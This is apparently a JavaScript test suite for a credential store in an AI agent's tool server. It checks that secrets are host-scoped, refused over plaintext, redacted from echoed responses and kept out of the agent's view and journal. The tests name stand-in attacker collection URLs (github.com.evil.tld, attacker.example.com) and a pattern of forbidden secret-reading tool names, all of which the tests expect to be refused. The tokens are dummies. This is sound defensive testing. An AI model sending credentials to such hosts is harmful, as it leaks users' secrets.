// Identities the agent can use and never see.
//
// A secret that reaches an agent's context is exfiltrated by ARCHITECTURE, not
// by attack: everything it reads is sent to a model on the next turn. So the
// test is not "is the store encrypted" — it is whether the credential can be
// got at through any of the doors that are actually open.
//
//   - no tool returns it, and none returns a piece of it
//   - the scope is enforced BEFORE the request leaves, so knowing the name of
//     an identity is not enough to be handed its credential
//   - plaintext is refused: attaching a token to http:// sends it in the clear
//   - the response is scanned on the way back, because an API that echoes its
//     own Authorization header would hand over what all of the above kept out
//   - and the journal records WHICH identity acted, never the value — the
//     journal being the one file designed to be read later by someone else
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import assert from "node:assert";
import http from "node:http";
import { spawn, execFileSync } from "node:child_process";

const home = fs.mkdtempSync(path.join(os.tmpdir(), "nef-sec-"));
process.env.NEFERTARI_HOME = home;

const secrets = await import("../src/secrets.mjs");

const TOKEN = "ghp_thisIsTheSecretValueNobodyMayEverSee0123";

// --- an identity with no scope is refused, because a name would be enough ---
{
  const r = secrets.put({ name: "github", value: TOKEN, hosts: [] });
  assert.equal(r.ok, false);
  assert.match(r.reason, /at least one host/, "a credential that can be pointed anywhere is not scoped, it is loose");
  console.log("  ok — an identity with no scope is refused at the door");
}

// --- stored, and then unreachable ---
{
  const r = secrets.put({ name: "github", value: TOKEN, hosts: ["github.com"], note: "release automation" });
  assert.equal(r.ok, true);

  const listed = secrets.list();
  assert.equal(listed.length, 1);
  assert.deepEqual(listed[0].hosts, ["github.com"]);
  // The whole point, asserted rather than assumed: nothing in what an agent can
  // see contains the value, at any depth.
  assert.ok(!JSON.stringify(listed).includes(TOKEN), "the listing must not carry the value");
  assert.ok(!JSON.stringify(listed).includes(TOKEN.slice(0, 12)), "…nor a prefix of it: 200 questions rebuild a token");
  assert.ok(!("value" in listed[0]) && !("length" in listed[0]), "…nor its length, which is also information");
  console.log("  ok — the identity is listable and its value is not, at any depth");

  if (process.platform !== "win32") {
    const mode = fs.statSync(path.join(home, "identities.json")).mode & 0o777;
    assert.equal(mode, 0o600, `the store must be 0600 from creation (got ${mode.toString(8)})`);
    console.log("  ok — the store is 0600 from the moment it exists");
  }
}

// --- the scope is what makes the name safe to know ---
{
  assert.equal(secrets.allowedFor("github", "https://api.github.com/user").ok, true, "a subdomain of the scope is in scope");
  assert.equal(secrets.allowedFor("github", "https://github.com/x").ok, true);

  const evil = secrets.allowedFor("github", "https://github.com.evil.tld/collect");
  assert.equal(evil.ok, false, "a lookalike host must not match — this is why the check is a dot-boundary suffix");
  assert.match(evil.reason, /scoped to github\.com/);
  assert.match(evil.reason, /safe for you to know/, "and the refusal explains why the name was safe to hand out");

  assert.equal(secrets.allowedFor("nonexistent", "https://github.com").ok, false);
  console.log("  ok — a lookalike host is refused, and so is an identity that does not exist");
}

// --- plaintext is refused: the scope does not help if the wire is open ---
{
  const plain = secrets.allowedFor("github", "http://github.com/x");
  assert.equal(plain.ok, false);
  assert.match(plain.reason, /in the clear/);
  // …except on loopback, where there is no wire to listen on and a local
  // service is the normal case.
  secrets.put({ name: "local", value: "sk-localonly-abcdefgh", hosts: ["localhost", "127.0.0.1"] });
  assert.equal(secrets.allowedFor("local", "http://127.0.0.1:9000/x").ok, true, "loopback plaintext is not a wire");
  console.log("  ok — plaintext is refused off the machine and allowed on loopback");
}

// --- redaction covers every live credential, not just the one in use ---
{
  const echoed = `{"error":"bad token","sent":"Bearer ${TOKEN}","other":"sk-localonly-abcdefgh"}`;
  const clean = secrets.redact(echoed);
  assert.ok(!clean.text.includes(TOKEN), "the credential is gone");
  assert.ok(!clean.text.includes("sk-localonly-abcdefgh"), "and so is a DIFFERENT identity's — the same leak either way");
  assert.equal(clean.redacted, 2);
  assert.match(clean.text, /\[redacted: github\]/, "and what was removed is named, so the answer stays readable");
  console.log("  ok — every stored credential is redacted from a response, not only the one used");
}

// --- END TO END: the agent acts as an identity it cannot read ---
{
  const { ReadBuffer, serializeMessage } = await import("@modelcontextprotocol/sdk/shared/stdio.js");

  // A service that reflects what it was sent — the ordinary case that turns a
  // careful design into a leak if nobody scans the way back.
  let sawAuth = null;
  const service = http.createServer((req, res) => {
    sawAuth = req.headers.authorization || null;
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ ok: true, you_sent: req.headers.authorization, path: req.url }));
  });
  await new Promise((r) => service.listen(0, "127.0.0.1", r));
  const port = service.address().port;

  const srvHome = fs.mkdtempSync(path.join(os.tmpdir(), "nef-sec-h-"));
  const cli = path.join(import.meta.dirname, "..", "src", "cli.mjs");

  // The human adds the identity, from stdin, exactly as documented. Never argv:
  // a command line lands in shell history and in `ps`.
  const SERVICE_TOKEN = "svc_tokenThatMustNeverReachTheAgent99";
  execFileSync(
    process.execPath,
    [cli, "secret", "add", "svc", "--host", "127.0.0.1", "--note", "the test service"],
    { input: SERVICE_TOKEN, env: { ...process.env, NEFERTARI_HOME: srvHome }, stdio: ["pipe", "pipe", "pipe"] }
  );

  const child = spawn(process.execPath, [path.join(import.meta.dirname, "..", "src", "server.mjs")], {
    env: { ...process.env, NEFERTARI_HOME: srvHome, NEFERTARI_LOCAL_DRIVER: "null" },
    stdio: ["pipe", "pipe", "inherit"],
  });
  const buf = new ReadBuffer();
  const want = new Map();
  let id = 1;
  let everythingTheAgentSaw = "";
  child.stdout.on("data", (c) => {
    buf.append(c);
    for (;;) {
      let m;
      try {
        m = buf.readMessage();
      } catch {
        break;
      }
      if (!m) break;
      const f = want.get(m.id);
      if (f) {
        want.delete(m.id);
        f(m);
      }
    }
  });
  const call = (method, params) =>
    new Promise((res) => {
      const i = id++;
      want.set(i, res);
      child.stdin.write(serializeMessage({ jsonrpc: "2.0", id: i, method, params }));
    });
  const tool = async (name, args) => {
    const r = await call("tools/call", { name, arguments: args });
    const t = r.result?.content?.[0]?.text ?? JSON.stringify(r.error ?? {});
    everythingTheAgentSaw += t;
    try {
      return JSON.parse(t);
    } catch {
      return { raw: t };
    }
  };

  try {
    await call("initialize", { protocolVersion: "2024-11-05", capabilities: {}, clientInfo: { name: "t", version: "0" } });

    // No tool may exist that reads a secret. Asserted against the actual tool
    // list rather than trusting that nobody added one.
    const names = (await call("tools/list", {})).result.tools.map((t) => t.name);
    assert.ok(names.includes("secret_list") && names.includes("http_as"));
    assert.ok(
      !names.some((n) => /secret_(get|read|show|value|reveal)|get_secret/.test(n)),
      `nothing may return a credential, and these exist: ${names.join(", ")}`
    );
    console.log("  ok — there is no tool that reads a secret, and the tool list proves it");

    const seen = await tool("secret_list", {});
    assert.equal(seen.identities[0].name, "svc");
    assert.deepEqual(seen.identities[0].hosts, ["127.0.0.1"]);

    // The request the agent makes. It names an identity; it never holds one.
    const r = await tool("http_as", { identity: "svc", url: `http://127.0.0.1:${port}/whoami` });
    assert.equal(r.status, 200, `the call must go through: ${JSON.stringify(r).slice(0, 200)}`);
    assert.equal(sawAuth, `Bearer ${SERVICE_TOKEN}`, "PHYSICAL: the service really received the credential");
    console.log("  ok — the service got the credential, attached downstream of the agent");

    // …and it came back reflected, which is the trap.
    assert.equal(r.redacted !== undefined, true, "the reflection was caught");
    assert.ok(!r.body.includes(SERVICE_TOKEN), "and removed before the agent saw it");
    console.log(`  ok — the service echoed the token back and it was redacted: ${r.redacted}`);

    // Out of scope: the identity exists, the agent knows its name, and that
    // buys it nothing.
    const off = await tool("http_as", { identity: "svc", url: "https://attacker.example.com/collect" });
    assert.equal(off.status, "refused");
    assert.match(off.reason, /scoped to 127\.0\.0\.1/);
    console.log("  ok — pointed off its scope, the identity is refused rather than attached");

    // THE ASSERTION THAT COVERS ALL OF IT: across everything this agent was
    // ever handed, the credential does not appear once.
    assert.ok(!everythingTheAgentSaw.includes(SERVICE_TOKEN), "the credential must not appear ANYWHERE the agent could read");
    console.log("  ok — across every byte the agent received, the credential appears zero times");

    // And the record names the identity, never the value — the journal being
    // the file most likely to be read by someone else, later.
    const j = fs.readFileSync(path.join(srvHome, "journal.jsonl"), "utf8");
    assert.ok(!j.includes(SERVICE_TOKEN), "the journal must not contain the credential");
    const entries = j.trim().split("\n").map((l) => JSON.parse(l));
    const used = entries.find((e) => e.tool === "http_as" && e.identity === "svc");
    assert.ok(used, "but it must say which identity acted");
    assert.match(used.outcome, /127\.0\.0\.1 → 200/, "and against what, with what result");
    console.log("  ok — the journal records who acted and what happened, and not the secret");
  } finally {
    child.kill("SIGKILL");
    service.close();
    fs.rmSync(srvHome, { recursive: true, force: true });
  }
}

fs.rmSync(home, { recursive: true, force: true });
console.log("SECRET TESTS PASSED");
